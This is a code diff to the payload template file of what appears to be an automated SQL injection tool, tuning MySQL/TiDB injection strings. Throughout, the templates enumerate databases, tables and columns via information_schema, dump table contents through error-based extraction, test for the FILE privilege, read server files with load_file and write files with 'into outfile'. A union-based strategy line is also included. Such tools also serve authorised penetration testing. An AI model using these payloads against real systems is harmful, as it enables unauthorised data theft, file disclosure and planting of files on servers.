@@ -21,8 +21,8 @@ resource:
        separator ${separator_cell_hex}
    ) from (
        select
-           cast(schema_name as char) r,
-           cast(count(table_name) as char) q
+           schema_name r,
+           count(table_name) q
        from information_schema.tables
        right join information_schema.schemata
        on schema_name = table_schema
@@ -43,8 +43,8 @@ resource:
        separator ${separator_cell_hex}
    ) from (
        select
-           cast(table_name as char) r,
-           cast(ifnull(table_rows, 0x30) as char) q
+           table_name r,
+           ifnull(table_rows, 0x30) q
        from information_schema.tables
        where table_schema = 0x${database.hex}
        /* Required by Error Extractvalue */
@@ -62,7 +62,7 @@ resource:
        order by n
        separator ${separator_cell_hex}
    ) from (
-       select cast(column_name as char) n
+       select column_name n
        from information_schema.columns
        where table_schema = 0x${database.hex}
        and table_name = 0x${table.hex}
@@ -83,8 +83,8 @@ resource:
         separator ${separator_cell_hex}
     ) from (
         select
-            cast(concat(${fields}) as char) r,
-            cast(count(*) as char) q
+            concat(${fields}) r,
+            count(*) q
         from `${database}`.`${table}`
         group by r
         /* Required by Error Extractvalue */
@@ -145,7 +145,7 @@ resource:
        select concat(@a:=0,(select count(*) from (
            select concat(
                ${enclose_value_hex},
-               cast(schema_name as char),
+               schema_name,
                '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
            ) a
            from information_schema.schemata 
@@ -158,7 +158,7 @@ resource:
        select concat(@a:=0,(select count(*) from (
            select concat(
                ${enclose_value_hex},
-               cast(table_name as char),
+               table_name,
                '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
            ) a
            from information_schema.tables
@@ -172,7 +172,7 @@ resource:
        select concat(@a:=0,(select count(*) from (
            select concat(
                ${enclose_value_hex},
-               cast(column_name as char),
+               column_name,
                '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
            ) a
            from information_schema.columns
@@ -187,7 +187,7 @@ resource:
         select concat(@a:=0,(select count(*) from (
             select concat(
                 ${enclose_value_hex},
-                cast(concat(${fields}) as char),
+                concat(${fields}),
                 '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
             ) a
             from `${database}`.`${table}`
@@ -199,13 +199,13 @@ resource:
 
  file:
   privilege: |
-   cast((
+   (
        select if(count(*) = 1, 0x74727565, 0x66616c7365)
        from information_schema.user_privileges
-       where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
+       where grantee = concat(0x27, replace(current_user, 0x40, 0x274027), 0x27)
        and privilege_type = 0x46494c45
-   ) as char)
-  read: cast(load_file(0x${filepath.hex}) as char)
+   )
+  read: load_file(0x${filepath.hex})
   write:
    body: (select 0x${body.hex})
    path: into outfile '${filepath}'
@@ -248,6 +248,7 @@ strategy:
     - tidb
    orderByErrorMessage:
     - Unknown column '1337' in 'order clause'
+   vendorSpecific: if(${test}, 'a', 'b')='a'
 
  normal:
   indices: union select ${indices}
